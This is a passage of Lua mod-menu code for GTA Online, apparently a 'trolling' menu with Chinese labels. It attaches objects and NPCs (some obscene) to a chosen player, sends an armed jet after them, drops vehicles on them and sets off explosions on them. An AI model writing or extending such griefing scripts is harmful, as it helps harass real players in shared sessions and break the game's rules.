        npc3 = createped(26, 0x9CF26183, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc3, pedp, 0, 0, -0.30, 0, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc3, true)
        npc4 = createped(26, 0x9CF26183, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc4, pedp, 0, 0, 0.0, -0.30, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc4, true)
        npc5 = createped(26, 0x9CF26183, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc5, pedp, 0, 0, 0.60, 0, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc5, true)
        npc6 = createped(26, 0x9CF26183, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc6, pedp, 0, 0, 0.00, 0.60, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc6, true)
        npc7 = createped(26, 0x9CF26183, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc7, pedp, 0, 0, -0.60, 0, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc7, true)
        npc8 = createped(26, 0x9CF26183, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc8, pedp, 0, 0, 0.0, -0.60, 0.0, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc8, true)
    end)
    -- 附加物体
    GTAC(attach_update, "附加666", {}, "", function(f)
        spawned_cunts = {}
        pped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = v3()
        for i = 1, #OBJECT_AT do
            bone_idx = PED.GET_PED_BONE_INDEX(pped, OBJECT_AT[i])
            spawned_cunts[#spawned_cunts + 1] = OBJECT.CREATE_OBJECT_NO_OFFSET(84140480, 0, 0, 0, true, false)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(spawned_cunts[#spawned_cunts], pped, bone_idx, 0, 0, 0, 0, 0, 0, 0, true, true,
                false, 0, false)
        end
    end)
    GTAC(attach_update, "附加一身屎", {}, "", function(f)
        spawned_cunts = {}
        pped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = v3()
        for i = 1, #OBJECT_AT do
            bone_idx = PED.GET_PED_BONE_INDEX(pped, OBJECT_AT[i])
            spawned_cunts[#spawned_cunts + 1] = OBJECT.CREATE_OBJECT_NO_OFFSET(2223607550, 0, 0, 0, true, false)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(spawned_cunts[#spawned_cunts], pped, bone_idx, 0, 0, 0, 0, 0, 0, 0, true, true,
                false, 0, false)
        end
    end)
    GTAC(attach_update, "附加导弹车", {}, "", function(f)
        spawned_cunts = {}
        pped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = v3()
        for i = 1, #OBJECT_AT do
            bone_idx = PED.GET_PED_BONE_INDEX(pped, OBJECT_AT[i])
            spawned_cunts[#spawned_cunts + 1] = OBJECT.CREATE_OBJECT_NO_OFFSET(-692292317, 0, 0, 0, true, false)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(spawned_cunts[#spawned_cunts], pped, bone_idx, 0, 0, 0, 0, 0, 0, 0, true, true,
                false, 0, false)
        end
    end)
    GTAC(attach_update, "附加门", {}, "", function(f)
        spawned_cunts = {}
        pped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = v3()
        for i = 1, #OBJECT_AT do
            bone_idx = PED.GET_PED_BONE_INDEX(pped, OBJECT_AT[i])
            spawned_cunts[#spawned_cunts + 1] = OBJECT.CREATE_OBJECT_NO_OFFSET(520341586, 0, 0, 0, true, false)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(spawned_cunts[#spawned_cunts], pped, bone_idx, 0, 0, 0, 0, 0, 0, 0, true, true,
                false, 0, false)
        end
    end)
    GTAC(attach_update, "附加假jb", {}, "", function(f)
        spawned_cunts = {}
        pped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = v3()
        for i = 1, #OBJECT_AT do
            bone_idx = PED.GET_PED_BONE_INDEX(pped, OBJECT_AT[i])
            spawned_cunts[#spawned_cunts + 1] = OBJECT.CREATE_OBJECT_NO_OFFSET(-422877666, 0, 0, 0, true, false)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(spawned_cunts[#spawned_cunts], pped, bone_idx, 0, 0, 0, 0, 0, 0, 0, true, true,
                false, 0, false)
        end
    end)
    GTAC(attach_update, "附加篮球", {}, "", function(f)
        playerped1 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        attach_object1 = OBJECT.CREATE_OBJECT_NO_OFFSET(1840863642, 0, 0, 0, true, false)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(attach_object1, playerped1, 0, 0, 0, 0, 0, 0.0, 0, 0.0, true, true, false, 0, false)
    end)
    GTAC(attach_update, "附加篝火", {}, "", function(f)
        playerped1 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        attach_object1 = OBJECT.CREATE_OBJECT_NO_OFFSET(-1065766299, 0, 0, 0, true, false)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(attach_object1, playerped1, 0, 0, 0, 0, 0, 0.0, 0, 0.0, true, true, false, 0, false)
    end)
    GTAC(attach_update, "附加垃圾桶", {}, "", function(f)
        playerped2 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        attach_object2 = OBJECT.CREATE_OBJECT_NO_OFFSET(1143474856, 0, 0, 0, true, false)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(attach_object2, playerped2, 0, 0, 0, 0, 0, 0.0, 0, 0.0, true, true, false, 0, false)
    end)
    GTAC(attach_update, "附加仙人掌", {}, "", function(f)
        playerped3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        attach_object3 = OBJECT.CREATE_OBJECT_NO_OFFSET(-194496699, 0, 0, 0, true, false)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(attach_object3, playerped3, 0, 0, 0, 0, 0, 0.0, 0, 0.0, true, true, false, 0, false)
    end)
    GTAC(attach_update, "附加消防栓", {}, "", function(f)
        playerped3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        attach_object3 = OBJECT.CREATE_OBJECT_NO_OFFSET(200846641, 0, 0, 0, true, false)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(attach_object3, playerped3, 0, 0, 0, 0, 0, 0.0, 0, 0.0, true, true, false, 0, false)
    end)
    GTAC(attach_update, "附加加油站", {}, "", function(f)
        playerped3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        attach_object3 = OBJECT.CREATE_OBJECT_NO_OFFSET(-2007231801, 0, 0, 0, true, false)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(attach_object3, playerped3, 0, 0, 0, 0, 0, 0.0, 0, 0.0, true, true, false, 0, false)
    end)
    GTAC(attach_update, "附加太阳伞", {}, "", function(f)
        playerped3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        attach_object3 = OBJECT.CREATE_OBJECT_NO_OFFSET(-2108662770, 0, 0, 0, true, false)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(attach_object3, playerped3, 0, 0, 0, 0, 0, 0.0, 0, 0.0, true, true, false, 0, false)
    end)
    GTAC(attach_update, "附加傻逼", {}, "", function(f)
        playerped3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        attach_object3 = OBJECT.CREATE_OBJECT_NO_OFFSET(-1059647297, 0, 0, 0, true, false)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(attach_object3, playerped3, 0, 0, 0, 0, 0.5, 0.0, 0, 0.0, true, true, false, 0, false)
    end)
    GTAC(attach_update, "附加国旗", {}, "", function(f)
        playerped3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        attach_object3 = OBJECT.CREATE_OBJECT_NO_OFFSET(757141590, 0, 0, 0, true, false)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(attach_object3, playerped3, 0, 0, 0, 0, 0.5, 0.0, 0, 0.0, true, true, false, 0, false)
    end)
    local attack = GT(playerMain, "闪电突击", {}, "召唤军队袭击该玩家")
    require "lib.GTlib.GTA.attacker"
    lazer_visible = true
    local gunner_weapons = "weapon_combatmg"
    GTAC(attack, "突击该玩家!!!", {"flashout"}, "默认无敌模式", function()
        local pilot, lazer = spawn_lazer(pid, gunner_weapons, collision)
        while ENTITY.GET_ENTITY_HEALTH(PLAYER.GET_PLAYER_PED(pid), pilot) > 0 do
            local player_peds = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local a = ENTITY.GET_ENTITY_COORDS(player_peds)
            local b = ENTITY.GET_ENTITY_COORDS(lazer)
            if MISC.GET_DISTANCE_BETWEEN_COORDS(a.x, a.y, a.z, b.x, b.y, b.z, true) > 90 then
                TASK.TASK_HELI_CHASE(pilot, player_peds, 0, 0, 50)
            else
                TASK.TASK_HELI_MISSION(pilot, lazer, 0, player_peds, a.x, a.y, a.z, 23, 30, -1, -1, 10, 10, 5, 0)
            end
            wait()
        end
    end)
    GTTG(attack, "可见性", {"visablearmy"}, "是否让目标玩家可发现", function(on)
        lazer_visible = on
    end, true)
    GTTG(attack, "碰撞性", {"collisionarmy"}, "是否存在实体碰撞(基本碰撞始终启用)", function(on)
        collision = on
    end, false)
    GTAC(attack, "删除", {"deletearmy"}, "删除你的军队", function()
        menu.trigger_commands("superc")
    end)
    local playerOtherTrolling = GT(playerMain, "载具恶搞", {}, "")
    updateveh = GT(playerOtherTrolling, "载具飞升")
    local player_veh_teleport = GT(playerOtherTrolling, "传送载具", {}, "")
    GTAC(updateveh, '史车', {}, '对方需在车里', function()
        local vehicle = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
        if not PED.IS_PED_IN_ANY_VEHICLE(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), false) then
            return gtoast("不在车辆中. :<")
        end
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
        for _, boneName in pairs({"seat_pside_r", "bodyshell", "platelight", "attach_female", "bonnet", "windscreen_f",
                                "windscreen", "seat_dside_f", "seat_pside_f", "exhaust"}) do
            local bone = ENTITY.GET_ENTITY_BONE_INDEX_BY_NAME(vehicle, boneName)
            local boojj1 = OBJECT.CREATE_OBJECT(joaat("prop_big_shit_02"), pos.x, pos.y, pos.z, true, true, false)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(boojj1, vehicle, bone, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
        end
    end)
    GTTG(updateveh, '轮子有几个妹妹', {}, '对方需在车里', function(gqd)
        local function createped(type, hash, pos, dir)
            STREAMING.REQUEST_MODEL(hash)
            while not STREAMING.HAS_MODEL_LOADED(hash) do
                wait(10)
            end
            local ped = entities.create_ped(type, hash, pos, dir, true, false)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
            return ped
        end
        if gqd then
            local vehicle = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
            if not PED.IS_PED_IN_ANY_VEHICLE(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), false) then
                return gtoast("不在车辆中. :<")
            end
            local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
            for _, boneName in pairs({"wheel_lf", "wheel_lr", "wheel_rf", "wheel_rr"}) do
                local bone = ENTITY.GET_ENTITY_BONE_INDEX_BY_NAME(vehicle, boneName)
                local boojj1 = createped(26, 0x9CF26183, pos, 0)
                ENTITY.ATTACH_ENTITY_TO_ENTITY(boojj1, vehicle, bone, -0.2, 0, 0, 0, 0, 0, true, true, false, 0, true)
            end
        else
            local count = 0
            for k, ent in pairs(entities.get_all_peds_as_handles()) do
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
                entities.delete_by_handle(ent)
                count = count + 1
                wait()
            end
        end
    end)
    GTTG(updateveh, '给予国家的荣誉', {}, '对方需在车里', function(gqf)
        if gqf then
            local vehicle = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
            if not PED.IS_PED_IN_ANY_VEHICLE(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), false) then
                return gtoast("不在车辆中. :<")
            end
            local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
            for _, boneName in pairs({"wheel_lf", "wheel_rf"}) do
                local bone = ENTITY.GET_ENTITY_BONE_INDEX_BY_NAME(vehicle, boneName)
                local boojj1 = OBJECT.CREATE_OBJECT(joaat("apa_prop_flag_china"), pos.x, pos.y, pos.z, true, true, false)
                ENTITY.ATTACH_ENTITY_TO_ENTITY(boojj1, vehicle, bone, 0, 0, 1.3, 0, 0, 0, true, true, false, 0, true)
            end
        else
            local count = 0
            for k, ent in pairs(entities.get_all_objects_as_handles()) do
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
                entities.delete_by_handle(ent)
                count = count + 1
                wait()
            end
        end
    end)
    local vehicleModels = {"adder", "Airbus", "Airtug", "akula", "akuma", "aleutian", "alkonost", "alpha", "alphaz1",
                        "AMBULANCE", "annihilator", "annihilator2", "apc", "ardent", "armytanker", "armytrailer",
                        "armytrailer2", "asbo", "asea", "asea2", "asterope", "asterope2", "astron", "autarch", "avarus",
                        "avenger", "avenger2", "avenger3", "avenger4", "avisa", "bagger", "baletrailer", "Baller",
                        "baller2", "baller3", "baller4", "baller5", "baller6", "baller7", "baller8", "banshee",
                        "banshee2", "BARRACKS", "BARRACKS2", "BARRACKS3", "barrage", "bati", "bati2", "Benson",
                        "benson2", "besra", "bestiagts", "bf400", "BfInjection", "Biff", "bifta", "bison", "Bison2",
                        "Bison3", "BjXL", "blade", "blazer", "blazer2", "blazer3", "blazer4", "blazer5", "BLIMP",
                        "BLIMP2", "blimp3", "blista", "blista2", "blista3", "BMX", "boattrailer", "boattrailer2",
                        "boattrailer3", "bobcatXL", "Bodhi2", "bombushka", "boor", "boxville", "boxville2", "boxville3",
                        "boxville4", "boxville5", "boxville6", "brawler", "brickade", "brickade2", "brigham", "brioso",
                        "brioso2", "brioso3", "broadway", "bruiser", "bruiser2", "bruiser3", "brutus", "brutus2",
                        "brutus3", "btype", "btype2", "btype3", "buccaneer", "buccaneer2", "buffalo", "buffalo2",
                        "buffalo3", "buffalo4", "buffalo5", "bulldozer", "bullet", "Burrito", "burrito2", "burrito3",
                        "Burrito4", "burrito5", "BUS", "buzzard", "Buzzard2", "cablecar", "caddy", "Caddy2", "caddy3",
                        "calico", "CAMPER", "caracara", "caracara2", "carbonizzare", "carbonrs", "Cargobob", "cargobob2",
                        "Cargobob3", "Cargobob4", "cargoplane", "cargoplane2", "casco", "cavalcade", "cavalcade2",
                        "cavalcade3", "cerberus", "cerberus2", "cerberus3", "champion", "cheburek", "cheetah",
                        "cheetah2", "chernobog", "chimera", "chino", "chino2", "cinquemila", "cliffhanger", "clique",
                        "clique2", "club", "coach", "cog55", "cog552", "cogcabrio", "cognoscenti", "cognoscenti2",
                        "comet2", "comet3", "comet4", "comet5", "comet6", "comet7", "conada", "conada2", "contender",
                        "coquette", "coquette2", "coquette3", "coquette4", "corsita", "coureur", "cruiser", "CRUSADER",
                        "cuban800", "cutter", "cyclone", "cyclone2", "cypher", "daemon", "daemon2", "deathbike",
                        "deathbike2", "deathbike3", "defiler", "deity", "deluxo", "deveste", "deviant", "diablous",
                        "diablous2", "dilettante", "dilettante2", "Dinghy", "dinghy2", "dinghy3", "dinghy4", "dinghy5",
                        "dloader", "docktrailer", "docktug", "dodo", "Dominator", "dominator2", "dominator3",
                        "dominator4", "dominator5", "dominator6", "dominator7", "dominator8", "dominator9", "dorado",
                        "double", "drafter", "draugur", "drifteuros", "driftfr36", "driftfuto", "driftjester",
                        "driftremus", "drifttampa", "driftyosemite", "driftzr350", "dubsta", "dubsta2", "dubsta3",
                        "dukes", "dukes2", "dukes3", "dump", "dune", "dune2", "dune3", "dune4", "dune5", "duster",
                        "Dynasty", "elegy", "elegy2", "ellie", "emerus", "emperor", "Emperor2", "emperor3", "enduro",
                        "entity2", "entity3", "entityxf", "esskey", "eudora", "Euros", "everon", "everon2", "exemplar",
                        "f620", "faction", "faction2", "faction3", "fagaloa", "faggio", "faggio2", "faggio3", "FBI",
                        "FBI2", "fcr", "fcr2", "felon", "felon2", "feltzer2", "feltzer3", "firetruk", "fixter",
                        "flashgt", "FLATBED", "fmj", "FORKLIFT", "formula", "formula2", "fq2", "fr36", "freecrawler",
                        "freight", "freight2", "freightcar", "freightcar2", "freightcont1", "freightcont2",
                        "freightgrain", "freighttrailer", "Frogger", "frogger2", "fugitive", "furia", "furoregt",
                        "fusilade", "futo", "futo2", "gargoyle", "Gauntlet", "gauntlet2", "gauntlet3", "gauntlet4",
                        "gauntlet5", "gauntlet6", "gb200", "gburrito", "gburrito2", "glendale", "glendale2", "gp1",
                        "graintrailer", "GRANGER", "granger2", "greenwood", "gresley", "growler", "gt500", "guardian",
                        "habanero", "hakuchou", "hakuchou2", "halftrack", "handler", "Hauler", "Hauler2", "havok",
                        "hellion", "hermes", "hexer", "hotknife", "hotring", "howard", "hunter", "huntley", "hustler",
                        "hydra", "ignus", "ignus2", "imorgon", "impaler", "impaler2", "impaler3", "impaler4", "impaler5",
                        "impaler6", "imperator", "imperator2", "imperator3", "inductor", "inductor2", "infernus",
                        "infernus2", "ingot", "innovation", "insurgent", "insurgent2", "insurgent3", "intruder", "issi2",
                        "issi3", "issi4", "issi5", "issi6", "issi7", "issi8", "italigtb", "italigtb2", "italigto",
                        "italirsx", "iwagen", "jackal", "jb700", "jb7002", "jester", "jester2", "jester3", "jester4",
                        "jet", "jetmax", "journey", "journey2", "jubilee", "jugular", "kalahari", "kamacho", "kanjo",
                        "kanjosj", "khamelion", "khanjali", "komoda", "kosatka", "krieger", "kuruma", "kuruma2", "l35",
                        "landstalker", "landstalker2", "Lazer", "le7b", "lectro", "lguard", "limo2", "lm87", "locust",
                        "longfin", "lurcher", "luxor", "luxor2", "lynx", "mamba", "mammatus", "manana", "manana2",
                        "manchez", "manchez2", "manchez3", "marquis", "marshall", "massacro", "massacro2", "maverick",
                        "menacer", "MESA", "mesa2", "MESA3", "metrotrain", "michelli", "microlight", "Miljet",
                        "minitank", "minivan", "minivan2", "Mixer", "Mixer2", "mogul", "molotok", "monroe", "monster",
                        "monster3", "monster4", "monster5", "monstrociti", "moonbeam", "moonbeam2", "Mower", "Mule",
                        "Mule2", "Mule3", "mule4", "mule5", "nebula", "nemesis", "neo", "neon", "nero", "nero2",
                        "nightblade", "nightshade", "nightshark", "nimbus", "ninef", "ninef2", "nokota", "Novak",
                        "omnis", "omnisegt", "openwheel1", "openwheel2", "oppressor", "oppressor2", "oracle", "oracle2",
                        "osiris", "outlaw", "Packer", "panthere", "panto", "paradise", "paragon", "paragon2", "pariah",
                        "patriot", "patriot2", "patriot3", "patrolboat", "pbus", "pbus2", "pcj", "penetrator",
                        "penumbra", "penumbra2", "peyote", "peyote2", "peyote3", "pfister811", "Phantom", "phantom2",
                        "phantom3", "Phantom4", "Phoenix", "picador", "pigalle", "polgauntlet", "police", "police2",
                        "police3", "police4", "police5", "policeb", "policeold1", "policeold2", "policet", "polmav",
                        "pony", "pony2", "postlude", "Pounder", "pounder2", "powersurge", "prairie", "pRanger",
                        "Predator", "premier", "previon", "primo", "primo2", "proptrailer", "prototipo", "pyro", "r300",
                        "radi", "raiden", "raiju", "raketrailer", "rallytruck", "RancherXL", "rancherxl2", "RapidGT",
                        "RapidGT2", "rapidgt3", "raptor", "ratbike", "ratel", "ratloader", "ratloader2", "rcbandito",
                        "reaper", "Rebel", "rebel2", "rebla", "reever", "regina", "remus", "Rentalbus", "retinue",
                        "retinue2", "revolter", "rhapsody", "rhinehart", "RHINO", "riata", "RIOT", "riot2", "Ripley",
                        "rocoto", "rogue", "romero", "rrocket", "rt3000", "Rubble", "ruffian", "ruiner", "ruiner2",
                        "ruiner3", "ruiner4", "rumpo", "rumpo2", "rumpo3", "ruston", "s80", "s95", "sabregt", "sabregt2",
                        "Sadler", "sadler2", "Sanchez", "sanchez2", "sanctus", "sandking", "sandking2", "savage",
                        "savestra", "sc1", "scarab", "scarab2", "scarab3", "schafter2", "schafter3", "schafter4",
                        "schafter5", "schafter6", "schlagen", "schwarzer", "scorcher", "scramjet", "scrap", "seabreeze",
                        "seashark", "seashark2", "seashark3", "seasparrow", "seasparrow2", "seasparrow3", "Seminole",
                        "seminole2", "sentinel", "sentinel2", "sentinel3", "sentinel4", "serrano", "SEVEN70", "Shamal",
                        "sheava", "SHERIFF", "sheriff2", "shinobi", "shotaro", "skylift", "slamtruck", "slamvan",
                        "slamvan2", "slamvan3", "slamvan4", "slamvan5", "slamvan6", "sm722", "sovereign", "SPECTER",
                        "SPECTER2", "speeder", "speeder2", "speedo", "speedo2", "speedo4", "speedo5", "squaddie",
                        "squalo", "stafford", "stalion", "stalion2", "stanier", "starling", "stinger", "stingergt",
                        "stingertt", "stockade", "stockade3", "stratum", "streamer216", "streiter", "stretch",
                        "strikeforce", "stromberg", "Stryder", "Stunt", "submersible", "submersible2", "Sugoi", "sultan",
                        "sultan2", "sultan3", "sultanrs", "Suntrap", "superd", "supervolito", "supervolito2", "Surano",
                        "SURFER", "Surfer2", "surfer3", "surge", "swift", "swift2", "swinger", "t20", "Taco", "tahoma",
                        "tailgater", "tailgater2", "taipan", "tampa", "tampa2", "tampa3", "tanker", "tanker2",
                        "tankercar", "taxi", "technical", "technical2", "technical3", "tempesta", "tenf", "tenf2",
                        "terbyte", "terminus", "tezeract", "thrax", "thrust", "thruster", "tigon", "TipTruck",
                        "TipTruck2", "titan", "toreador", "torero", "torero2", "tornado", "tornado2", "tornado3",
                        "tornado4", "tornado5", "tornado6", "toro", "toro2", "toros", "TOURBUS", "TOWTRUCK", "Towtruck2",
                        "towtruck3", "towtruck4", "tr2", "tr3", "tr4", "TRACTOR", "tractor2", "tractor3", "trailerlarge",
                        "trailerlogs", "trailers", "trailers2", "trailers3", "trailers4", "trailers5", "trailersmall",
                        "trailersmall2", "Trash", "trash2", "trflat", "tribike", "tribike2", "tribike3", "trophytruck",
                        "trophytruck2", "tropic", "tropic2", "tropos", "tug", "tula", "tulip", "tulip2", "turismo2",
                        "turismo3", "turismor", "tvtrailer", "tvtrailer2", "tyrant", "tyrus", "utillitruck",
                        "utillitruck2", "Utillitruck3", "vacca", "Vader", "vagner", "vagrant", "valkyrie", "valkyrie2",
                        "vamos", "vectre", "velum", "velum2", "verlierer2", "verus", "vestra", "vetir", "veto", "veto2",
                        "vigero", "vigero2", "vigero3", "vigilante", "vindicator", "virgo", "virgo2", "virgo3", "virtue",
                        "viseris", "visione", "vivanite", "volatol", "volatus", "voltic", "voltic2", "voodoo", "voodoo2",
                        "vortex", "vstr", "warrener", "warrener2", "washington", "wastelander", "weevil", "weevil2",
                        "windsor", "windsor2", "winky", "wolfsbane", "xa21", "xls", "xls2", "yosemite", "yosemite2",
                        "yosemite3", "youga", "youga2", "youga3", "youga4", "z190", "zeno", "zentorno", "zhaba", "zion",
                        "zion2", "zion3", "zombiea", "zombieb", "zorrusso", "zr350", "zr380", "zr3802", "zr3803", "Ztype"}
    GTLP(updateveh, '载具循环轰炸', {}, '', function()
        if NETWORK.NETWORK_IS_PLAYER_ACTIVE(pid) then
            local coords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
            local randomModel = vehicleModels[math.random(1, #vehicleModels)]
            local modelHash = MISC.GET_HASH_KEY(randomModel)
            local vehicle = VEHICLE.CREATE_VEHICLE(modelHash, coords.x, coords.y, coords.z + 20, 0.0, true, true, false)
            ENTITY.SET_ENTITY_ROTATION(vehicle, 0, 0, 0, 2, true)
            local networkId = NETWORK.VEH_TO_NET(vehicle)
            if NETWORK.NETWORK_GET_ENTITY_IS_NETWORKED(vehicle) then
                NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(networkId, true)
            end
            if vehicle then
                ENTITY.SET_ENTITY_VELOCITY(vehicle, 0, 0, -100000000)
                VEHICLE.SET_ALLOW_VEHICLE_EXPLODES_ON_CONTACT(vehicle, true)
            end
            local vehicle2 = VEHICLE.CREATE_VEHICLE(modelHash, coords.x, coords.y, coords.z - 20, 0.0, true, true, false)
            ENTITY.SET_ENTITY_ROTATION(vehicle2, 0, 0, 0, 2, true)
            local networkId = NETWORK.VEH_TO_NET(vehicle2)
            if NETWORK.NETWORK_GET_ENTITY_IS_NETWORKED(vehicle2) then
                NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(networkId, true)
            end
            if vehicle2 then
                ENTITY.SET_ENTITY_VELOCITY(vehicle2, 0, 0, 100000000)
                VEHICLE.SET_ALLOW_VEHICLE_EXPLODES_ON_CONTACT(vehicle2, true)
            end
            gtoast("汽车轰炸 " .. PLAYER.GET_PLAYER_NAME(pid))
            set_entity_as_no_longer_needed(vehicle)
            set_entity_as_no_longer_needed(vehicle2)
        end
    end)
    local balls = {"p_ld_soc_ball_01", "p_ld_am_ball_01", "prop_bowling_ball", "prop_beach_volball01",
                "prop_beach_volball02", "prop_beachball_02", "v_ilev_exball_blue"}
    GTLP(updateveh, '神奇的输出', {}, '即使不在车中也可以使用', function()
        local vehtable = entities.get_all_vehicles_as_handles()
        for _, vehs in pairs(vehtable) do
            local selfpos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
            local ped = VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehs, -1, false)
            local player = false
            for playerId = 0, 31 do
                if PLAYER.GET_PLAYER_PED(playerId) == ped then
                    player = true
                end
            end
            if ped ~= 0 and player == false then
                requestControlLoop(vehs)
                requestControlLoop(ped)
                TASK.TASK_VEHICLE_DRIVE_TO_COORD(ped, vehs, selfpos.x, selfpos.y, selfpos.z, 70.0, 1, vehs, 16777216, 0.0, 1)
            else
            end
        end
        local selectedItem = "prop_cs_dildo_01"
        local coords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), false)
        while not STREAMING.HAS_MODEL_LOADED(joaat(selectedItem)) do
            STREAMING.REQUEST_MODEL(joaat(selectedItem))
            wait()
        end
        OBJECT.CREATE_AMBIENT_PICKUP(738282662, coords.x, coords.y, coords.z + 1.5, 0, 1, joaat(selectedItem), false, true)
        local randomIndex = math.random(1, #balls)
        local selectedItem = balls[randomIndex]
        local coords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), false)
        while not STREAMING.HAS_MODEL_LOADED(joaat(selectedItem)) do
            STREAMING.REQUEST_MODEL(joaat(selectedItem))
            wait()
        end
        OBJECT.CREATE_AMBIENT_PICKUP(738282662, coords.x, coords.y, coords.z + 2, 0, 1, joaat(selectedItem), false, true)
        if not PED.IS_PED_IN_ANY_VEHICLE(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true) then
            gtoast("玩家不在车里")
        else
            veh = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
            local time = os.time()
            local request = false
            while not request do
                if os.time() - time >= 5 then
                    gtoast("无法控制车辆")
                    break
                end
                request = requestControlLoop(veh)
                wait()
            end
            gtoast("旋转的车辆")
            ENTITY.APPLY_FORCE_TO_ENTITY(veh, 5, 0, 0, 150.0, 0, 0, 0, 0, true, false, true, false, true)
        end
        player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        coords = ENTITY.GET_ENTITY_COORDS(player, true)
        FIRE.ADD_OWNED_EXPLOSION(player, coords.x, coords.y, coords.z - 2.0, 24, 1, true, false, 0)
        player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        coords = ENTITY.GET_ENTITY_COORDS(player, true)
        FIRE.ADD_OWNED_EXPLOSION(player, coords.x, coords.y, coords.z - 2.0, 11, 1, true, false, 0)
        player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        coords = ENTITY.GET_ENTITY_COORDS(player, true)
        FIRE.ADD_OWNED_EXPLOSION(player, coords.x, coords.y, coords.z - 2.0, 13, 1, true, false, 0)
        player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        coords = ENTITY.GET_ENTITY_COORDS(player, true)
        FIRE.ADD_OWNED_EXPLOSION(player, coords.x, coords.y, coords.z - 2.0, 1, 100, true, false, 2147483647)
        player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        coords = ENTITY.GET_ENTITY_COORDS(player, true)
        FIRE.ADD_OWNED_EXPLOSION(player, coords.x, coords.y, coords.z - 2.0, 1, 0, true, false, 2147483647)
    end)
    --
    GTLuaScript.list_action(playerOtherTrolling, "附加车辆", {}, "", {"到他的车", "他的车到我的车", "我的车到他的车", "分离"}, function(index, value, click_type)
    local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
    if car ~= 0 then
        request_control_of_entity(car)
        pluto_switch index do
            case 1: 
